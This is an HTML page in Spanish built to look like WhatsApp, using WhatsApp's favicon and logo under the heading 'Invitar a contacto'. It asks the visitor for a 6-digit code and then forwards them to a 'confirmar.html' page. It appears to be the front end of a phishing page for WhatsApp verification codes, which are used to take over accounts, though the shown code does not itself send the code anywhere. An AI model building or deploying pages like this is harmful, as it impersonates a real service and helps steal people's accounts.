<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Invitar</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://web.whatsapp.com/favicon.ico">
    <style>
        body {
            margin: 0;
            background: #128C7E;
            font-family: Arial, sans-serif;
        }
        
        .header {
            background: #075E54;
            padding: 20px;
            text-align: center;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .whatsapp-logo {
            width: 40px;
            margin-right: 10px;
        }
        
        .main-content {
            background: #ECE5DD;
            min-height: 100vh;
            padding: 50px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .input-code {
            width: 250px;
            height: 50px;
            border: 2px solid #25D366;
            border-radius: 25px;
            font-size: 20px;
            text-align: center;
            margin: 30px 0;
            padding: 5px;
        }
        
        .continue-btn {
            background: #25D366;
            color: white;
            padding: 12px 40px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            display: none; /* Inicialmente oculto */
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo" alt="Logo">
        <h2>Invitar a contacto</h2>
    </div>
    
    <div class="main-content">
        <input 
            type="number" 
            class="input-code" 
            placeholder="6 dÃ­gitos"
            maxlength="6"
            id="codigoInput"
            oninput="toggleButton()"
        >
        <button class="continue-btn" id="btnContinuar" onclick="window.location.href='confirmar.html'">Continuar</button>
    </div>

    <script>
        function toggleButton() {
            const input = document.getElementById('codigoInput');
            const boton = document.getElementById('btnContinuar');
            
            if(input.value.length === 6) {
                boton.style.display = 'block';
            } else {
                boton.style.display = 'none';
            }
        }
    </script>
</body>
</html>
